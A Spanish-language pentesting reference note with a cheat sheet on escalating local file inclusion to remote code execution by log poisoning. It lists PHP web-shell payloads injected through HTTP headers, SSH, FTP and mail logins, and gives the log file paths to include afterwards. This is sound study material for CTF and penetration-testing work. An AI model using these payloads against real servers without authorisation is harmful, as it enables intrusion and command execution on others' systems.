---
aliases:
  - "Log Poisoning"
tags:
  - type/technique
  - vuln/lfi
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[File Inclusion]]"
---
# LFI To RCE - Log Poisoning 

***

## Cheatsheet

|                **Técnica**                 |                               **Descripción**                               |                                      **Payload**                                      |
| :----------------------------------------: | :-------------------------------------------------------------------------: | :-----------------------------------------------------------------------------------: |
|         <br>**Apache access log**          |   <br>Inyectar código PHP en el User-Agent y luego incluir el access log    | <br>UA: `<?php system($_GET['cmd']); ?>` → LFI: `/var/log/apache2/access.log`<br><br> |
|          <br>**Apache error log**          | <br>Provocar un error con código PHP en la URL y luego incluir el error log |  <br>Request a `<?php system('id'); ?>` → LFI: `/var/log/apache2/error.log`<br><br>   |
|          <br>**Nginx access log**          |              <br>Mismo concepto pero apuntando a logs de Nginx              |      <br>UA: `<?php system('id'); ?>` → LFI: `/var/log/nginx/access.log`<br><br>      |
|          <br>**Nginx error log**           |                <br>Provocar errores con payload PHP en Nginx                |                      <br>LFI: `/var/log/nginx/error.log`<br><br>                      |
|            <br>**SSH auth log**            |         <br>Intentar login SSH con usuario que contenga código PHP          |     <br>`ssh '<?php system("id"); ?>'@target` → LFI: `/var/log/auth.log`<br><br>      |
|              <br>**Mail log**              |           <br>Enviar un mail con código PHP en el campo de datos            |                <br>SMTP con payload → LFI: `/var/log/mail.log`<br><br>                |
|              <br>**FTP log**               |         <br>Intentar login FTP con usuario que contenga código PHP          |     <br>Login como `<?php system('id'); ?>` → LFI: `/var/log/vsftpd.log`<br><br>      |
|            <br>**Proc self fd**            | <br>Acceder a file descriptors del proceso en vez de rutas de log estáticas |                      <br>LFI: `/proc/self/fd/2` (stderr)<br><br>                      |
| <br>**Envenenamiento vía Referer**<br><br> |                <br>Inyectar código PHP en el header Referer                 |          <br>Referer: `<?php system('id'); ?>` → incluir access log<br><br>           |
| <br>**Envenenamiento vía Cookie**<br><br>  |             <br>Inyectar código PHP en una cookie personalizada             |           <br>Cookie: `<?php system('id'); ?>` → incluir access log<br><br>           |
^lfi-logpoisoning

***

## Overview

Log poisoning convierte un LFI de lectura de archivos en ejecución de código. La idea es simple: primero inyectás código PHP en algún archivo de log del servidor (a través de headers HTTP, intentos de login, o cualquier input que quede registrado), y después usás el LFI para incluir ese log, haciendo que PHP ejecute el código inyectado. El principal desafío es encontrar la ruta exacta del archivo de log (varía según distribución y configuración) y que el usuario del servidor web tenga permisos de lectura sobre ese archivo. Es una técnica muy usada en CTFs y en pentesting real cuando no hay otro camino a RCE.


***
